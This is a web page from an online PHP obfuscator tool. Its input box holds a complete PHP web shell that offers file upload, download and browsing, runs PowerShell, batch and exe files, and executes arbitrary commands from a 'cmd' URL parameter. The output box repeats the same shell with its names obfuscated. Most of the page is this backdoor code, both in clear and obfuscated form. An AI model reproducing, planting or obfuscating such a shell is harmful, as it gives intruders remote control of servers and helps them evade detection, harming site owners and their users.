<!DOCTYPE html>
<html lang="en">
<head>
<title>PHP Obfuscator</title>
<meta name="description" content="The PHP Obfuscator online tool obfuscates the source code of a PHP script so that it is difficult to read by people and it's significance may be recognized only with difficulty.">
<meta name="robots" content="index,follow">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="/styles/global.css">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<script>if(top!=self) top.location=self.location;</script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
function CookiesOk() {
	SetCookie("Cookies", "ok", 3650);
}
function NoCookies() {
	SetCookie("Cookies", "no", 3650);
}
function SetCookie(name, value, days) {
	var d = new Date();
	d.setTime(d.getTime() + (days * 86400000));
	document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/";
}
</script>
</head>
<body>

<div class="div_table gaijin_logo_bar"><div class="div_row">
<div class="div_cell gaijin_logo"><a href="/en/"><div>Gaijin<span class="gaijin_logo_dot">.</span><span class="gaijin_logo_at">at</span></div></a></div>
<div class="div_cell">&nbsp;&nbsp;&nbsp;</div>
<div class="div_cell gaijin_space_cell"></div>
</div></div>

<ul class="menubar">

<li><a href="/en/" title="Home" style="height:1.5rem; width:2rem;">
<svg viewbox="0 0 100 85" width="100%" height="100%">
  <polygon points="0,50 50,00 100,50" style="fill:rgb(255,255,255)" />
  <rect x="15" y="45" width="25" height="40" style="fill:rgb(255,255,255);" />
  <rect x="60" y="45" width="25" height="40" style="fill:rgb(255,255,255);" />
</svg>
</a></li>

<li><a href="/en/tools/">Online Tools</a></li>
<li><a href="/en/infos/">Information</a></li>
<li><a href="/en/software/">Software</a></li>
<li><a href="/en/wallpapers/">Wallpapers</a></li>

<li class="menuright"><a href="/de/tools/php-obfuscator">Deutsch</a></li>
</ul>

<div class="page">

<div class="page_content">
<h1>PHP Obfuscator</h1>

<p>The PHP Obfuscator online tool obfuscates the source code of a PHP script so that it is difficult to read by people and it's significance may be recognized only with difficulty.</p>

<p>In the case of a release of PHP scripts we might often avoid that other people can easily identify the exact function of the script, or we want to make it difficult for them to use the code for their own scripts.</p>

<p>For this, PHP Obfuscator renames the variable name, interface, class and function names into meaningless characters and numbers. Spaces, empty lines and comments will be removed from the source code. Furthermore, strings (except "here docs" blocks) can be encoded, which can be useful to avoid simple changes to the script output.</p>

<p>With PHP Obfuscator, no complete illegibility of the source code can be achieved, since the PHP server must be still able to process the script - even without additional software installed on the server.</p>

<p>For proper processing of the script, the full source code or the entire file (including HTML tags) should be pasted. If you want to process only a portion of a script, the code block must be contain a PHP start and end tag.</p>






<div class="box_form">
<form action="/en/tools/php-obfuscator#result" method="post">
<table class="form_table">

<tr><td class="form_comment">Please paste the PHP source code you want to obfuscate:</td></tr>
<tr><td><textarea name="p_source" cols="70" rows="10">&lt;?php
    // Password protection, useful for King of The Hill games
    $pass=''; // Set to null to disable; Set to string to enable, must be the sha512 hash of the password.

        global $cmdresults;
        global $retval;
    if($pass != null) {
        if (isset($_COOKIE['pass'])) { // We use cookies and not url parameter for security reasons
            // As it is likely that URL parameters are logged by the webserver, thus revealing the password
            if (hash('sha512', $_COOKIE['pass']) !== $pass) {
                echo &quot;Wrong password !&quot;;
                exit;
            }
        } else {
            echo &quot;Wrong password !&quot;;
            exit;
        }
    }

    function getAbsolute(string $path): string
    {
        // Cleaning path regarding OS
        $path = mb_ereg_replace('\\\\|/', '/', $path, 'msr');
        // Check if path start with a separator (UNIX)
        $startWithSeparator = $path[0] === '/';
        // Check if start with drive letter
        preg_match('/^[a-z]:/', $path, $matches);
        $startWithLetterDir = isset($matches[0]) ? $matches[0] : false;
        // Get and filter empty sub paths
        $subPaths = array_filter(explode('/', $path), 'mb_strlen');

        $absolutes = [];
        foreach ($subPaths as $subPath) {
            if ('.' === $subPath) {
                continue;
            }
            // if $startWithSeparator is false
            // and $startWithLetterDir
            // and (absolutes is empty or all previous values are ..)
            // save absolute cause that's a relative and we can't deal with that and just forget that we want go up
            if ('..' === $subPath
                &amp;&amp; !$startWithSeparator
                &amp;&amp; !$startWithLetterDir
                &amp;&amp; empty(array_filter($absolutes, function ($value) { return !('..' === $value); }))
            ) {
                $absolutes[] = $subPath;
                continue;
            }
            if ('..' === $subPath) {
                array_pop($absolutes);
                continue;
            }
            $absolutes[] = $subPath;
        }

        return
            (($startWithSeparator ? '/' : $startWithLetterDir) ?
                $startWithLetterDir.'/' : ''
            ).implode('/', $absolutes);
    }

    // Upload file to the server
    if (isset($_POST['upload'])) {
        $desinationDir = getDir();
        $destinationFile = $desinationDir.'/'.basename($_FILES['file']['name']);

        if (file_exists($destinationFile)) {
            echo &quot;&lt;script&gt;alert('Error: File already exists !')&lt;/script&gt;&quot;;
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $destinationFile)) {
            echo &quot;&lt;script&gt;alert('File uploaded successfuly !')&lt;/script&gt;&quot;;
        } else {
            echo &quot;&lt;script&gt;alert('Error: Could not upload file !')&lt;/script&gt;&quot;;
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $script = $_GET['runscript'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -File &quot;' . $scriptPath . '&quot;';
        global $cmdresults;
        global $retval;
        $cmdresults = shell_exec($command);
    }
    else if (isset($_GET['runexe'])) {
        $script = $_GET['runexe'];
        $scriptPath = getAbsolute($script);
        $command = $scriptPath;
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$scriptPath, $cmdresults, $retval);
    }
    else if (isset($_GET['runbat'])) {
        $script = $_GET['runbat'];
        $scriptPath = getAbsolute($script);
        $command = 'pwsh -Noni -Nop -Command { Start-Process &quot;cmd.exe&quot; -ArgumentList @(&quot;/k&quot;,&quot;' . $scriptPath . ') }';
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$scriptPath, $cmdresults, $retval);
    }
    
    // Download a file from the server
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file)) {
            if (is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=&quot;'.basename($file).'&quot;');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($file));
                readfile($file);
                exit;
            } else {
                echo &quot;&lt;script&gt;alert('Error: Could not read the file !')&lt;/script&gt;&quot;;
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($level){
        switch ($level) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($name) {
        $n = strrpos($name, '.');
        return ($n === false) ? '' : substr($name, $n+1);
    }
    function getItemSize($filename) {
        $retval =  '';
        $fname = getDir().'/'.$filename;
        if (is_dir($fname)){  
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getDirectoryColor() . '&quot;&gt;';
            $retval .= htmlspecialchars('&lt;dir&gt;');
        }
        else{
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $retsize = formatSizeUnits(filesize($fname));
            $retval .= $retsize;
        }
        $retval .= '&lt;/td&gt;';
        return $retval;
    }
    function getItemActions($filename) {
        $retval =  '';
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        switch ($ext) {
          case &quot;ps1&quot;:
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $retval .= makeRunScriptFile($filename);
            break;
          case &quot;bat&quot;:
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $retval .= makeRunBatFile($filename);
            break;
          case &quot;exe&quot;:
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $retval .= makeRunExeFile($filename);
            break;
          default:
            $retval .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $retval .= htmlspecialchars('noop');
        }
        $retval .= '&lt;/td&gt;';
        return $retval;
    }
    function printPerms($file) {
        $mode = fileperms($file);
        if( $mode &amp; 0x1000 ) { $type='p'; }
        else if( $mode &amp; 0x2000 ) { $type='c'; }
        else if( $mode &amp; 0x4000 ) { $type='d'; }
        else if( $mode &amp; 0x6000 ) { $type='b'; }
        else if( $mode &amp; 0x8000 ) { $type='-'; }
        else if( $mode &amp; 0xA000 ) { $type='l'; }
        else if( $mode &amp; 0xC000 ) { $type='s'; }
        else $type='u';
        $owner[&quot;read&quot;] = ($mode &amp; 00400) ? 'r' : '-';
        $owner[&quot;write&quot;] = ($mode &amp; 00200) ? 'w' : '-';
        $owner[&quot;execute&quot;] = ($mode &amp; 00100) ? 'x' : '-';
        $group[&quot;read&quot;] = ($mode &amp; 00040) ? 'r' : '-';
        $group[&quot;write&quot;] = ($mode &amp; 00020) ? 'w' : '-';
        $group[&quot;execute&quot;] = ($mode &amp; 00010) ? 'x' : '-';
        $world[&quot;read&quot;] = ($mode &amp; 00004) ? 'r' : '-';
        $world[&quot;write&quot;] = ($mode &amp; 00002) ? 'w' : '-';
        $world[&quot;execute&quot;] = ($mode &amp; 00001) ? 'x' : '-';
        if( $mode &amp; 0x800 ) $owner[&quot;execute&quot;] = ($owner['execute']=='x') ? 's' : 'S';
        if( $mode &amp; 0x400 ) $group[&quot;execute&quot;] = ($group['execute']=='x') ? 's' : 'S';
        if( $mode &amp; 0x200 ) $world[&quot;execute&quot;] = ($world['execute']=='x') ? 't' : 'T';
        $s=sprintf(&quot;%1s&quot;, $type);
        $s.=sprintf(&quot;%1s%1s%1s&quot;, $owner['read'], $owner['write'], $owner['execute']);
        $s.=sprintf(&quot;%1s%1s%1s&quot;, $group['read'], $group['write'], $group['execute']);
        $s.=sprintf(&quot;%1s%1s%1s&quot;, $world['read'], $world['write'], $world['execute']);
        return $s;
    }

    function formatSizeUnits($bytes) {
        if ($bytes &gt;= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes &gt;= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes &gt;= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }
        elseif ($bytes &gt; 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($file) {
        if (is_dir(getDir().'/'.$file)) {
            return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$file).'&quot;&gt;'.$file.'&lt;/a&gt;';
        } else {
            return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$file).'&quot;&gt;'.$file.'&lt;/a&gt;';
        }
    }
    function makeRunScriptFile($file) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function makeRunExeFile($file) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function makeRunBatFile($file) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function getFiles() {
        $files = scandir(getDir());

        $even = true;
        if ($files != null) {
            foreach($files as $filename){
                //Simply print them out onto the screen.
                echo '&lt;tr style=&quot;background-color:'.($even  ? '#515151' : '#212121').';&quot;&gt;';
                echo '&lt;td style=&quot;font-weight:thin;&quot;&gt;'.makeFileName($filename).'&lt;/td&gt;'; 
                //echo '&lt;td&gt;owner&lt;/td&gt;';
                //echo '&lt;td&gt;'.printPerms(getDir().'/'.$filename).'&lt;/td&gt;';
                echo ''.getItemSize($filename).'';
                echo ''.getItemActions($filename).'';
                echo '&lt;/tr&gt;';
                $even = !$even;
            }
        } else {
            echo &quot;&lt;p&gt;Couldn't open that directory !&quot;;
        }
    }

    function getCmdResults() {
        global $cmdresults;
        global $retval;
        
        if ($retval == 0 ) {
            if($cmdresults != null){
                foreach ($cmdresults as $line) {

                    if($line != null){
                        echo &quot;&lt;br&gt;&quot;;
                        echo htmlspecialchars($line);
                        echo &quot;\n&quot;;
                        
                    }
                }
            }
        } else {
            echo &quot;Execution failed with error code: &quot;.$retval;
        }    
    }

    function getCommandLine() {
        $hostname = gethostname() ?? 'none';
        $username = get_current_user();
        $dir = getDir();
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '&lt;span style=&quot;color: #ff6347&quot;&gt;'.$username.'@'.$hostname.'&lt;/span&gt;: &lt;span style=&quot;color: #B40404&quot;&gt;'.$dir.'&lt;/span&gt;$ '.$cmd;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$_GET['cmd'], $cmdresults, $retval);
    }
?&gt;</textarea></td></tr>

<tr>
	<td>

		<table>
			<tr>
				<td><label for="obcom"><input type="checkbox" name="p_obcom" id="obcom" value="1"  checked="checked"> Remove comments</label></td>
				<td style="padding-left:16px;"></td>
				<td><label for="obspc"><input type="checkbox" name="p_obspc" id="obspc" value="1" > Remove whitespaces</label></td>
			</tr>
			<tr>
				<td><label for="obvar"><input type="checkbox" name="p_obvar" id="obvar" value="1"  checked="checked"> Obfuscate variable names</label></td>
				<td style="padding-left:16px;"></td>
				<td><label for="obnam"><input type="checkbox" name="p_obnam" id="obnam" value="1" > Obfuscate function and class names</label></td>
			</tr>
			<tr>
				<td><label for="obstr"><input type="checkbox" name="p_obstr" id="obstr" value="1" > Encode strings</label></td>
				<td style="padding-left:16px;"></td>
				<td><label for="obashex"><input type="checkbox" name="p_obashex" id="obashex" value="1" > Use hexadecimal values for names</label></td>
			</tr>
		</table>

	</td>
</tr>

<tr><td colspan="2"><div class="form_line_dotted"></div></td></tr>

<tr>
	<td>

		<table>
			<tr>
				<th>Renaming Method:</th>
				<td>
					<select name="p_obmethod" size="1">
<option value="NUM">Numbering</option>
<option value="MD5">MD5</option>
<option value="CRC32" selected="selected">CRC32</option>
					</select>
				</td>
			</tr>

			<tr>
				<th>Prefix Length:</th>
				<td>
					<select name="p_obprelen" size="1">
<option value="0">0</option>
<option value="1">1</option>
<option value="2" selected="selected">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="6">6</option>
<option value="8">8</option>
					</select>
				</td>
			</tr>

			<tr>
				<th>Prefix Delimiter:</th>
				<td>
					<select name="p_obpredelim" size="1">
						<option value=""  selected="selected">None</option>
						<option value="_" >Underscore (_)</option>
					</select>
				</td>
			</tr>

			<tr>
				<th>MD5 Length:</th>
				<td>
					<select name="p_obmd5len" size="1">
<option value="8" selected="selected">8</option>
<option value="12">12</option>
<option value="16">16</option>
<option value="24">24</option>
<option value="32">32</option>
					</select>
				</td>
			</tr>

		</table>

	</td>
</tr>

<tr>
	<td>
		<div class="form_space"></div>
		<input type="submit" class="form_button" name="submit" value="Obfuscate Source Code">
		<input type="hidden" name="p_send" value="1">
	</td>
</tr>

</table>
</form>
</div>



<div class="cont_content" style="margin:32px 0 16px 0; overflow:auto;"><div id="container_content_alt" class="container_alt"><p>Did you like my page, one of my freeware applications or online tools?</p><p style="margin-top:16px;">Then, please <a href="https://www.paypal.com/donate/?hosted_button_id=QQJ483ACM34AG" class="link_external" target="_blank" rel="noopener nofollow" title="Donate via PayPal">donate via PayPal</a> in order to help keeping its content free - each amount is welcome!</p><p style="margin-top:16px;"><a href="/en/donate">Read more about support options...</a></p></div><div id="container_content_ext" style="display:none;"><ins class="adsbygoogle" style="display:block;overflow:hidden;" data-ad-client="ca-pub-4549485846911679" data-ad-slot="9662075536" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div>
<div id="result"></div>
<h2>Obfuscated PHP Source Code:</h2>
<div class="box_form"><form><textarea cols="70" rows="20">&lt;?php         $we3463500836=''; 
        global $gh572007645;
        global $js708420072;
    if($we3463500836 != null) {
        if (isset($_COOKIE['pass'])) {                         if (hash('sha512', $_COOKIE['pass']) !== $we3463500836) {
                echo &quot;Wrong password !&quot;;
                exit;
            }
        } else {
            echo &quot;Wrong password !&quot;;
            exit;
        }
    }

    function getAbsolute(string $ee190089999): string
    {
                $ee190089999 = mb_ereg_replace('\\\\|/', '/', $ee190089999, 'msr');
                $ep666533230 = $ee190089999[0] === '/';
                preg_match('/^[a-z]:/', $ee190089999, $fo103159226);
        $de298497536 = isset($fo103159226[0]) ? $fo103159226[0] : false;
                $xn818431695 = array_filter(explode('/', $ee190089999), 'mb_strlen');

        $xh2577458364 = [];
        foreach ($xn818431695 as $nr1926452922) {
            if ('.' === $nr1926452922) {
                continue;
            }
                                                            if ('..' === $nr1926452922
                &amp;&amp; !$ep666533230
                &amp;&amp; !$de298497536
                &amp;&amp; empty(array_filter($xh2577458364, function ($sx494360628) { return !('..' === $sx494360628); }))
            ) {
                $xh2577458364[] = $nr1926452922;
                continue;
            }
            if ('..' === $nr1926452922) {
                array_pop($xh2577458364);
                continue;
            }
            $xh2577458364[] = $nr1926452922;
        }

        return
            (($ep666533230 ? '/' : $de298497536) ?
                $de298497536.'/' : ''
            ).implode('/', $xh2577458364);
    }

        if (isset($_POST['upload'])) {
        $ho972891117 = getDir();
        $es2085602742 = $ho972891117.'/'.basename($_FILES['file']['name']);

        if (file_exists($es2085602742)) {
            echo &quot;&lt;script&gt;alert('Error: File already exists !')&lt;/script&gt;&quot;;
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $es2085602742)) {
            echo &quot;&lt;script&gt;alert('File uploaded successfuly !')&lt;/script&gt;&quot;;
        } else {
            echo &quot;&lt;script&gt;alert('Error: Could not upload file !')&lt;/script&gt;&quot;;
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $pu478250810 = $_GET['runscript'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = 'pwsh -Noni -Nop -File &quot;' . $sn3860055220 . '&quot;';
        global $gh572007645;
        global $js708420072;
        $gh572007645 = shell_exec($lh2395663060);
    }
    else if (isset($_GET['runexe'])) {
        $pu478250810 = $_GET['runexe'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = $sn3860055220;
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$sn3860055220, $gh572007645, $js708420072);
    }
    else if (isset($_GET['runbat'])) {
        $pu478250810 = $_GET['runbat'];
        $sn3860055220 = getAbsolute($pu478250810);
        $lh2395663060 = 'pwsh -Noni -Nop -Command { Start-Process &quot;cmd.exe&quot; -ArgumentList @(&quot;/k&quot;,&quot;' . $sn3860055220 . ') }';
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$sn3860055220, $gh572007645, $js708420072);
    }
    
        if (isset($_GET['download'])) {
        $nj2359244304 = $_GET['download'];
        if (file_exists($nj2359244304)) {
            if (is_readable($nj2359244304)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=&quot;'.basename($nj2359244304).'&quot;');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($nj2359244304));
                readfile($nj2359244304);
                exit;
            } else {
                echo &quot;&lt;script&gt;alert('Error: Could not read the file !')&lt;/script&gt;&quot;;
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($ky2599078931){
        switch ($ky2599078931) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($tw1579384326) {
        $ie2013832146 = strrpos($tw1579384326, '.');
        return ($ie2013832146 === false) ? '' : substr($tw1579384326, $ie2013832146+1);
    }
    function getItemSize($ta1007413605) {
        $js708420072 =  '';
        $re2939671786 = getDir().'/'.$ta1007413605;
        if (is_dir($re2939671786)){  
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getDirectoryColor() . '&quot;&gt;';
            $js708420072 .= htmlspecialchars('&lt;dir&gt;');
        }
        else{
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $wz1685339628 = formatSizeUnits(filesize($re2939671786));
            $js708420072 .= $wz1685339628;
        }
        $js708420072 .= '&lt;/td&gt;';
        return $js708420072;
    }
    function getItemActions($ta1007413605) {
        $js708420072 =  '';
        $jc30643714 = pathinfo($ta1007413605, PATHINFO_EXTENSION);
        switch ($jc30643714) {
          case &quot;ps1&quot;:
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $js708420072 .= makeRunScriptFile($ta1007413605);
            break;
          case &quot;bat&quot;:
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $js708420072 .= makeRunBatFile($ta1007413605);
            break;
          case &quot;exe&quot;:
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $js708420072 .= makeRunExeFile($ta1007413605);
            break;
          default:
            $js708420072 .=  '&lt;td style=&quot;color: &quot;' .  getSecondaryColor() . '&quot;&gt;';
            $js708420072 .= htmlspecialchars('noop');
        }
        $js708420072 .= '&lt;/td&gt;';
        return $js708420072;
    }
    function printPerms($nj2359244304) {
        $ab2546616235 = fileperms($nj2359244304);
        if( $ab2546616235 &amp; 0x1000 ) { $ug2363381545='p'; }
        else if( $ab2546616235 &amp; 0x2000 ) { $ug2363381545='c'; }
        else if( $ab2546616235 &amp; 0x4000 ) { $ug2363381545='d'; }
        else if( $ab2546616235 &amp; 0x6000 ) { $ug2363381545='b'; }
        else if( $ab2546616235 &amp; 0x8000 ) { $ug2363381545='-'; }
        else if( $ab2546616235 &amp; 0xA000 ) { $ug2363381545='l'; }
        else if( $ab2546616235 &amp; 0xC000 ) { $ug2363381545='s'; }
        else $ug2363381545='u';
        $zz3479234172[&quot;read&quot;] = ($ab2546616235 &amp; 00400) ? 'r' : '-';
        $zz3479234172[&quot;write&quot;] = ($ab2546616235 &amp; 00200) ? 'w' : '-';
        $zz3479234172[&quot;execute&quot;] = ($ab2546616235 &amp; 00100) ? 'x' : '-';
        $oa1841317061[&quot;read&quot;] = ($ab2546616235 &amp; 00040) ? 'r' : '-';
        $oa1841317061[&quot;write&quot;] = ($ab2546616235 &amp; 00020) ? 'w' : '-';
        $oa1841317061[&quot;execute&quot;] = ($ab2546616235 &amp; 00010) ? 'x' : '-';
        $wn980881731[&quot;read&quot;] = ($ab2546616235 &amp; 00004) ? 'r' : '-';
        $wn980881731[&quot;write&quot;] = ($ab2546616235 &amp; 00002) ? 'w' : '-';
        $wn980881731[&quot;execute&quot;] = ($ab2546616235 &amp; 00001) ? 'x' : '-';
        if( $ab2546616235 &amp; 0x800 ) $zz3479234172[&quot;execute&quot;] = ($zz3479234172['execute']=='x') ? 's' : 'S';
        if( $ab2546616235 &amp; 0x400 ) $oa1841317061[&quot;execute&quot;] = ($oa1841317061['execute']=='x') ? 's' : 'S';
        if( $ab2546616235 &amp; 0x200 ) $wn980881731[&quot;execute&quot;] = ($wn980881731['execute']=='x') ? 't' : 'T';
        $eo453955339=sprintf(&quot;%1s&quot;, $ug2363381545);
        $eo453955339.=sprintf(&quot;%1s%1s%1s&quot;, $zz3479234172['read'], $zz3479234172['write'], $zz3479234172['execute']);
        $eo453955339.=sprintf(&quot;%1s%1s%1s&quot;, $oa1841317061['read'], $oa1841317061['write'], $oa1841317061['execute']);
        $eo453955339.=sprintf(&quot;%1s%1s%1s&quot;, $wn980881731['read'], $wn980881731['write'], $wn980881731['execute']);
        return $eo453955339;
    }

    function formatSizeUnits($va2979611598) {
        if ($va2979611598 &gt;= 1073741824)
        {
            $va2979611598 = number_format($va2979611598 / 1073741824, 2) . ' GB';
        }
        elseif ($va2979611598 &gt;= 1048576)
        {
            $va2979611598 = number_format($va2979611598 / 1048576, 2) . ' MB';
        }
        elseif ($va2979611598 &gt;= 1024)
        {
            $va2979611598 = number_format($va2979611598 / 1024, 2) . ' KB';
        }
        elseif ($va2979611598 &gt; 1)
        {
            $va2979611598 = $va2979611598 . ' bytes';
        }
        elseif ($va2979611598 == 1)
        {
            $va2979611598 = $va2979611598 . ' byte';
        }
        else
        {
            $va2979611598 = '0 bytes';
        }

        return $va2979611598;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($nj2359244304) {
        if (is_dir(getDir().'/'.$nj2359244304)) {
            return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$nj2359244304).'&quot;&gt;'.$nj2359244304.'&lt;/a&gt;';
        } else {
            return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$nj2359244304).'&quot;&gt;'.$nj2359244304.'&lt;/a&gt;';
        }
    }
    function makeRunScriptFile($nj2359244304) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$nj2359244304).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function makeRunExeFile($nj2359244304) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$nj2359244304).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function makeRunBatFile($nj2359244304) {
        return '&lt;a href=&quot;'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$nj2359244304).'&amp;dir='.realpath(getDir()) . '&quot;&gt;'.'run&lt;/a&gt;';
    }
    function getFiles() {
        $wb104153177 = scandir(getDir());

        $pw3477086066 = true;
        if ($wb104153177 != null) {
            foreach($wb104153177 as $ta1007413605){
                                echo '&lt;tr style=&quot;background-color:'.($pw3477086066  ? '#515151' : '#212121').';&quot;&gt;';
                echo '&lt;td style=&quot;font-weight:thin;&quot;&gt;'.makeFileName($ta1007413605).'&lt;/td&gt;'; 
                                                echo ''.getItemSize($ta1007413605).'';
                echo ''.getItemActions($ta1007413605).'';
                echo '&lt;/tr&gt;';
                $pw3477086066 = !$pw3477086066;
            }
        } else {
            echo &quot;&lt;p&gt;Couldn't open that directory !&quot;;
        }
    }

    function getCmdResults() {
        global $gh572007645;
        global $js708420072;
        
        if ($js708420072 == 0 ) {
            if($gh572007645 != null){
                foreach ($gh572007645 as $aj3507795190) {

                    if($aj3507795190 != null){
                        echo &quot;&lt;br&gt;&quot;;
                        echo htmlspecialchars($aj3507795190);
                        echo &quot;\n&quot;;
                        
                    }
                }
            }
        } else {
            echo &quot;Execution failed with error code: &quot;.$js708420072;
        }    
    }

    function getCommandLine() {
        $xd3847340049 = gethostname() ?? 'none';
        $ep4166911607 = get_current_user();
        $rt3131800080 = getDir();
        $tc794565824 = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '&lt;span style=&quot;color: #ff6347&quot;&gt;'.$ep4166911607.'@'.$xd3847340049.'&lt;/span&gt;: &lt;span style=&quot;color: #B40404&quot;&gt;'.$rt3131800080.'&lt;/span&gt;$ '.$tc794565824;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' &amp;&amp; '.$_GET['cmd'], $gh572007645, $js708420072);
    }
?&gt;</textarea></form></div>



